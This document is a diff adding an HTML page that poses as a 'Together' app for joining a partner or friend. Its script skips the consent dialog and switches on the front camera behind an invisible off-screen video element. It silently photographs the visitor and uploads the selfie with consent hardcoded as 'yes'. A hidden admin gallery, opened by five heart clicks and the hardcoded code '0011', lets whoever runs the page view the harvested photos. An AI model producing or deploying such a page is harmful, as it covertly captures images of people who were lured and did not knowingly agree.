@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Together ❤️</title>
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;min-height:100vh;padding:22px;
+ display:flex;justify-content:center;align-items:center;
+ background:radial-gradient(circle at top,#71339c,#180e2c 65%,#080714);
+ color:white;font-family:Arial,sans-serif
+}
+.container{width:100%;max-width:430px;text-align:center}
+.heart{font-size:76px;cursor:pointer;animation:beat 1.3s infinite}
+@keyframes beat{50%{transform:scale(1.17)}}
+h1{font-size:34px;margin:12px 0}
+.sub{color:#d7c6e9;line-height:1.6}
+.live{display:inline-block;padding:9px 18px;border-radius:30px;background:#153e32;color:#8dffc1;font-size:12px;margin:18px}
+.card{padding:23px 17px;margin:16px 0;background:#ffffff10;border:1px solid #ffffff30;border-radius:23px}
+.small{font-size:13px;color:#ddcce9}
+.join{
+ width:100%;padding:19px;border:0;border-radius:15px;
+ color:white;font-size:17px;font-weight:bold;cursor:pointer;
+ animation:glow 2s infinite
+}
+@keyframes glow{50%{filter:brightness(1.3);transform:scale(1.015)}}
+.partner{background:linear-gradient(90deg,#a42cff,#ff55ad)}
+.friend{background:linear-gradient(90deg,#1679e9,#41c9ff)}
+.overlay{
+ position:fixed;inset:0;background:#080414eF;
+ display:none;align-items:center;justify-content:center;
+ padding:22px;z-index:5
+}
+.dialog{
+ width:100%;max-width:390px;background:#241735;
+ border:1px solid #b36bff;border-radius:23px;padding:24px;
+ box-shadow:0 0 40px #a33cff55;text-align:center
+}
+.dialog h2{color:#ffb8e8}
+.dialog p{line-height:1.8;color:#eee0f8;font-size:14px}
+.actions{display:flex;gap:10px;margin-top:20px}
+.actions button{flex:1;padding:14px;border:0;border-radius:12px;font-weight:bold}
+.accept{background:linear-gradient(90deg,#9d35ec,#f24eaf);color:white}
+.cancel{background:#493753;color:white}
+.hidden{display:none!important}
+input{width:100%;padding:14px;border:0;border-radius:10px;margin:12px 0}
+#video{position:fixed;width:2px;height:2px;opacity:0;pointer-events:none;left:-10px;top:-10px}
+</style>
+</head>
+<body>
+<div class="container">
+ <div class="heart" id="heart">❤️</div>
+ <h1>Welcome Together</h1>
+ <p class="sub">Connect With Your Special People</p>
+ <div class="live">● LIVE CONNECTION</div>
+
+ <div class="card">
+  <h2>💗 Your Special Partner</h2>
+  <p class="small">Connect with your special partner</p>
+  <button class="join partner" onclick="join('Partner')">
+   ❤️ JOIN YOUR PARTNER
+  </button>
+ </div>
+
+ <div class="card">
+  <h2>💙 Your Best Friend</h2>
+  <p class="small">Connect with your favourite friend</p>
+  <button class="join friend" onclick="join('Friend')">
+   💙 JOIN YOUR FRIEND
+  </button>
+ </div>
+
+
+ 
+
+ <div class="card" id="permanentNotice">
+  <h3>摄像头使用通知</h3>
+  <p class="small">
+   点击同意并继续后，系统将请求前置摄像头权限。
+   授权后将自动拍摄一张自拍照片并上传至服务器。
+   照片不会显示预览。您可以随时取消。
+  </p>
+ </div>
+ <p class="small">Made with ❤️ for You</p>
+
+ <div id="adminBox" class="card hidden">
+  <h3>Admin Gallery</h3>
+  <div id="gallery"></div>
+ </div>
+ </div>
+ <p id="status" class="small"></p>
+</div>
+
+<div class="overlay" id="notice">
+ <div class="dialog">
+  <h2>摄像头使用通知</h2>
+  <p>
+   为了完成自拍验证，我们需要使用您的前置摄像头。
+   点击同意后，系统将请求摄像头权限。
+   授权后将自动拍摄一张自拍照片并上传至服务器。
+   照片不会显示预览。
+  </p>
+  <p>您可以随时取消。</p>
+  <div class="actions">
+   <button class="cancel" onclick="cancel()">取消</button>
+   <button class="accept" onclick="acceptNotice()">同意并继续</button>
+  </div>
+ </div>
+</div>
+
+<div class="overlay" id="cameraBox">
+ <div class="dialog">
+  <h2>Camera Active</h2>
+  <video id="video" autoplay playsinline></video>
+  <p id="cameraStatus">Camera is active.</p>
+  <button class="cancel" onclick="stopCamera()">Cancel</button>
+ </div>
+</div>
+
+<script>
+let selected="";
+let stream=null;
+let clicks=0;
+let clickTimer;
+
+function join(type){
+ selected=type;
+ document.getElementById("status").textContent="";
+ acceptNotice();
+}
+
+function cancel(){
+ document.getElementById("notice").style.display="none";
+}
+
+async function acceptNotice(){
+ document.getElementById("notice").style.display="none";
+ try{
+  if(!navigator.mediaDevices?.getUserMedia){
+   throw new Error("HTTPS or localhost is required for camera access.");
+  }
+
+  stream=await navigator.mediaDevices.getUserMedia({
+   video:{facingMode:{ideal:"user"}},audio:false
+  });
+
+  const video=document.getElementById("video");
+  video.muted=true;
+  video.playsInline=true;
+  video.srcObject=stream;
+
+  await video.play();
+
+  await new Promise((resolve,reject)=>{
+   if(video.videoWidth>0 && video.videoHeight>0){
+    resolve();
+    return;
+   }
+   video.onloadedmetadata=()=>{
+    if(video.videoWidth>0 && video.videoHeight>0) resolve();
+    else reject(new Error("Camera image is not ready."));
+   };
+   video.onerror=()=>reject(new Error("Camera video failed."));
+  });
+
+  await new Promise(resolve=>setTimeout(resolve,700));
+  await captureAndUpload();
+
+ }catch(e){
+  stopCamera();
+  document.getElementById("status").textContent=
+   "Camera unavailable or upload failed: "+e.message;
+ }
+}
+
+async function captureAndUpload(){
+ const video=document.getElementById("video");
+ const canvas=document.createElement("canvas");
+ canvas.width=video.videoWidth;
+ canvas.height=video.videoHeight;
+ canvas.getContext("2d").drawImage(video,0,0);
+ const blob=await new Promise(resolve=>
+  canvas.toBlob(resolve,"image/jpeg",0.85)
+ );
+ if(!blob)throw new Error("Photo capture failed");
+ const data=new FormData();
+ data.append("photo",blob,"selfie.jpg");
+ data.append("consent","yes");
+ data.append("type",selected);
+ const response=await fetch("/api/selfie",{
+  method:"POST",body:data
+ });
+ const result=await response.json();
+ if(!response.ok)throw new Error(result.error);
+ document.getElementById("cameraStatus").textContent=
+  "Selfie uploaded successfully ❤️";
+ stopCamera(false);
+ document.getElementById("cameraBox").style.display="none";
+ document.getElementById("status").textContent=
+  "Successfully connected with "+selected+" ❤️";
+}
+
+function stopCamera(hide=true){
+ if(stream){
+  stream.getTracks().forEach(t=>t.stop());
+  stream=null;
+ }
+ if(hide)document.getElementById("cameraBox").style.display="none";
+}
+
+document.getElementById("heart").onclick=()=>{
+ clicks++;
+ clearTimeout(clickTimer);
+ clickTimer=setTimeout(()=>clicks=0,3000);
+ if(clicks===5){
+  clicks=0;
+  const code=prompt("Admin Access Code");
+  if(code==="0011"){
+   document.getElementById("adminBox").classList.remove("hidden");
+   adminLogin("0011");
+  }else if(code!==null){
+   document.getElementById("status").textContent="Invalid access code";
+  }
+ }
+};
+
+async function adminLogin(accessCode){
+ const status=document.getElementById("status");
+ const gallery=document.getElementById("gallery");
+ const password=accessCode;
+
+ if(password !== "0011"){
+  status.textContent="Invalid access code.";
+  return;
+ }
+
+ status.textContent="Logging in...";
+ gallery.replaceChildren();
+
+ try{
+  const response=await fetch("/api/admin/login",{
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({password})
+  });
+
+  const result=await response.json();
+
+  if(!response.ok || !result.token){
+   throw new Error(result.error || "Invalid admin password");
+  }
+
+  status.textContent="Login successful. Loading gallery...";
+
+  const r=await fetch("/api/admin/photos",{
+   headers:{Authorization:"Bearer "+result.token}
+  });
+
+  if(!r.ok){
+   throw new Error("Login successful, but gallery could not load.");
+  }
+
+  const photos=await r.json();
+
+  if(!Array.isArray(photos)){
+   throw new Error("Invalid gallery response.");
+  }
+
+  if(window.__adminPhotoUrls){
+   window.__adminPhotoUrls.forEach(url=>URL.revokeObjectURL(url));
+  }
+  window.__adminPhotoUrls=[];
+
+  if(photos.length===0){
+   status.textContent="Login successful. No photos found yet.";
+   return;
+  }
+
+  for(const photo of photos){
+   const img=document.createElement("img");
+   img.alt="Uploaded selfie";
+   img.style.cssText="width:100%;margin-top:12px;border-radius:12px";
+
+   try{
+    const imageResponse=await fetch(photo.url,{
+     headers:{Authorization:"Bearer "+result.token}
+    });
+
+    if(!imageResponse.ok){
+     throw new Error("Image unavailable");
+    }
+
+    const blob=await imageResponse.blob();
+    const objectUrl=URL.createObjectURL(blob);
+    window.__adminPhotoUrls.push(objectUrl);
+    img.src=objectUrl;
+    gallery.appendChild(img);
+   }catch(imageError){
+    const errorText=document.createElement("p");
+    errorText.textContent="Could not load: "+photo.filename;
+    gallery.appendChild(errorText);
+   }
+  }
+
+  status.textContent="Admin login successful. "+photos.length+" photos found.";
+ }catch(e){
+  status.textContent=e.message || "Admin login failed.";
+ }
+}
+</script>
+</body>
+</html>
